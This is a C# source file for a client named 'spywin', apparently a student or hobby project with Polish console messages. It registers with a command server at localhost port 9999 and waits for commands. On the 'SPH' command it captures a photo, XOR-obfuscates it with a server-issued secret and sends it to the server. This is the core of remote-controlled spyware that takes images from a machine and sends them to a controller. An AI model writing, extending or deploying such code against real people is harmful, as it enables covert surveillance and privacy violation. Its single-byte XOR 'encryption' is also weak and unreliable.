using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.IO;

namespace spywin
{
    public class StateObject
    {
        // Client socket.  
        public Socket workSocket = null;
        // Size of receive buffer.  
        public const int BufferSize = 256;
        // Receive buffer.  
        public byte[] buffer = new byte[BufferSize];
        // Received data string.  
        public StringBuilder sb = new StringBuilder();
    }

    //Ansynchronous client
    public class SpyClient
    {
        private static Socket clientSocket;
        private IPEndPoint remoteEP;
        // The response from the remote device.  
        private static String response = String.Empty;
        // Client's ID
        private static int userId;
        private static String secret;
        static String SERVER_URL = "127.0.0.1";
        static int SERVER_PORT = 9999;

        // ManualResetEvent instances signal completion.  
        private static ManualResetEvent connectDone =
            new ManualResetEvent(false);
        private static ManualResetEvent sendDone =
            new ManualResetEvent(false);
        private static ManualResetEvent receiveDone =
            new ManualResetEvent(false);

        public void setEndPoint(string ip, int portNumber)
        {
            IPAddress ipAddress = IPAddress.Parse(ip);
            remoteEP = new IPEndPoint(ipAddress, portNumber);
        }

        public void startClient()
        {
            try
            {
                setEndPoint(SERVER_URL, SERVER_PORT);
                connect();
                Send(clientSocket, prepareRegisterMessage("Natalka", "test"));
                Receive(clientSocket);
                receiveDone.WaitOne();
                Send(clientSocket, prepareAutorizeMessage(userId, "test"));
                Console.WriteLine("\nKoniec poleceń!\n");
                while (true)
                {
                    Receive(clientSocket);
                    receiveDone.WaitOne();
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }

        public void connect()
        {
            try
            {
                clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                Console.WriteLine("Connecting ...");
                clientSocket.BeginConnect(remoteEP, ConnectCallback, clientSocket);

                connectDone.WaitOne();
            }
            catch (Exception e)
            {
                Console.WriteLine("Exeption couldn't start a sender");
            }
        }

        private void ConnectCallback(IAsyncResult ar)
        {
            try
            {
                Socket socket = (Socket)ar.AsyncState;
                socket.EndConnect(ar);

                Console.WriteLine("Socket connected to {0}", clientSocket.RemoteEndPoint.ToString());

                connectDone.Set();
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }

        private MemoryStream prepareRegisterMessage(String login, String password)
        {
            String reg = "REG";
            MemoryStream ms = new MemoryStream();

            int messageSize = reg.Length + login.Length + password.Length + 2 * sizeof(int);
            ms.Write(BitConverter.GetBytes(BigEndian.FromBigEndian(messageSize)), 0, sizeof(int));
            ms.Write(Encoding.UTF8.GetBytes(reg), 0, reg.Length);
            ms.Write(BitConverter.GetBytes(BigEndian.FromBigEndian(login.Length)), 0, sizeof(int));
            ms.Write(Encoding.UTF8.GetBytes(login), 0, login.Length);
            ms.Write(BitConverter.GetBytes(BigEndian.FromBigEndian(password.Length)), 0, sizeof(int));
            ms.Write(Encoding.UTF8.GetBytes(password), 0, password.Length);

            return ms;
        }

        private MemoryStream prepareAutorizeMessage(int userId, String password)
        {
            String reg = "AUT";
            MemoryStream ms = new MemoryStream();

            int messageSize = reg.Length + password.Length + 2 * sizeof(int);
            ms.Write(BitConverter.GetBytes(BigEndian.FromBigEndian(messageSize)), 0, sizeof(int));
            ms.Write(Encoding.UTF8.GetBytes(reg), 0, reg.Length);
            ms.Write(BitConverter.GetBytes(BigEndian.FromBigEndian(userId)), 0, sizeof(int));
            ms.Write(BitConverter.GetBytes(BigEndian.FromBigEndian(password.Length)), 0, sizeof(int));
            ms.Write(Encoding.UTF8.GetBytes(password), 0, password.Length);

            return ms;
        }

        private static String handleReceivedMessage(String message)
        {
            byte[] bytes = Encoding.ASCII.GetBytes(message);
            int tmpValue, messageSize;
            String header = "";
            byte[] nextChars = new byte[4];
            try
            {
                Array.Copy(bytes, 0, nextChars, 0, sizeof(int));
                Array.Reverse(nextChars);
                messageSize = BitConverter.ToInt32(nextChars, 0);
                header = message.Substring(4, 3);
                if (header == "NAT" || header == "FCK")
                    ;
                else if (header == "SPH")
                    SpyClient.takePhoto();
                else
                {
                    Array.Copy(bytes, sizeof(int) + header.Length, nextChars, 0, sizeof(int));
                    Array.Reverse(nextChars);
                    tmpValue = BitConverter.ToInt32(nextChars, 0);
                    if (header == "ROK")
                    {
                        SpyClient.userId = tmpValue;
                    }
                    else if (header == "AOK")
                    {
                        SpyClient.secret = message.Substring(2 * sizeof(int) + header.Length, tmpValue);
                    }
                    else
                        return "";
                }
                return header;
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
                return header;
            }
        }

        private static void takePhoto()
        {
            Photo.capture();
            Console.WriteLine("Photo taken!");
            byte[] file = File.ReadAllBytes(Photo.fullFileName);
            byte[] message = encrypt(file, Encoding.ASCII.GetBytes(secret));
            SpyClient.Send(clientSocket, message);
        }

        public static byte[] encrypt(byte[] message, byte[] secret)
        {
            if (secret != null)
            {
                MemoryStream buffer = new MemoryStream(message.Length);

                int secretLength = secret.Length;
                for (int i = 0; i < message.Length; i++)
                {
                    byte b = (byte)(message[i] ^ secret[8 % secretLength]);
                    buffer.WriteByte(b);
                }
                return buffer.ToArray();
            }
            return message;
        }

        private static void Send(Socket client, MemoryStream dataStream)
        {
            byte[] data = dataStream.ToArray();

            // Begin sending the data to the remote device.  
            client.BeginSend(data, 0, data.Length, 0,
                new AsyncCallback(SendCallback), client);
        }

        private static void Send(Socket client, String data)
        {
            // Convert the string data to byte data using ASCII encoding.  
            byte[] byteData = Encoding.ASCII.GetBytes(data);

            // Begin sending the data to the remote device.  
            client.BeginSend(byteData, 0, byteData.Length, 0,
                new AsyncCallback(SendCallback), client);
        }

        private static void Send(Socket client, byte[] byteData)
        {
            // Begin sending the data to the remote device.  
            client.BeginSend(byteData, 0, byteData.Length, 0,
                new AsyncCallback(SendCallback), client);
        }

        private static void SendCallback(IAsyncResult ar)
        {
            try
            {
                // Retrieve the socket from the state object.  
                Socket client = (Socket)ar.AsyncState;

                // Complete sending the data to the remote device.  
                int bytesSent = client.EndSend(ar);
                Console.WriteLine("Sent {0} bytes to server.", bytesSent);
                sendDone.Set();
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }

        private static void Receive(Socket client)
        {
            try
            {
                // Create the state object.  
                StateObject state = new StateObject();
                state.workSocket = client;

                // Begin receiving the data from the remote device.  
                client.BeginReceive(state.buffer, 0, StateObject.BufferSize, 0,
                    new AsyncCallback(ReceiveCallback), state);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }

        private static void ReceiveCallback(IAsyncResult ar)
        {
            try
            {
                // Retrieve the state object and the client socket   
                // from the asynchronous state object.  
                StateObject state = (StateObject)ar.AsyncState;
                Socket client = state.workSocket;

                // Read data from the remote device.  
                int bytesRead = client.EndReceive(ar);

                if (bytesRead > 0)
                {
                    // There might be more data, so store the data received so far.  
                    state.sb.Append(Encoding.ASCII.GetString(state.buffer, 0, bytesRead));

                    // Get the rest of the data.  
                    if (bytesRead == StateObject.BufferSize)
                        client.BeginReceive(state.buffer, 0, StateObject.BufferSize, 0,
                        new AsyncCallback(ReceiveCallback), state);
                    else
                    {
                        // All the data has arrived; put it in response.  
                        if (state.sb.Length > 1)
                        {
                            response = state.sb.ToString();
                        }
                        // Signal that all bytes have been received.  
                        String message = handleReceivedMessage(response);
                        if (message == "")
                            Console.WriteLine("Błąd!!");
                        else
                            Console.WriteLine(message);
                        receiveDone.Set();
                    }

                }
                else
                {
                    //// All the data has arrived; put it in response.  
                    //if (state.sb.Length > 1)
                    //{
                    //    response = state.sb.ToString();
                    //}
                    //// Signal that all bytes have been received.  
                    //receiveDone.Set();
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }
    }
}
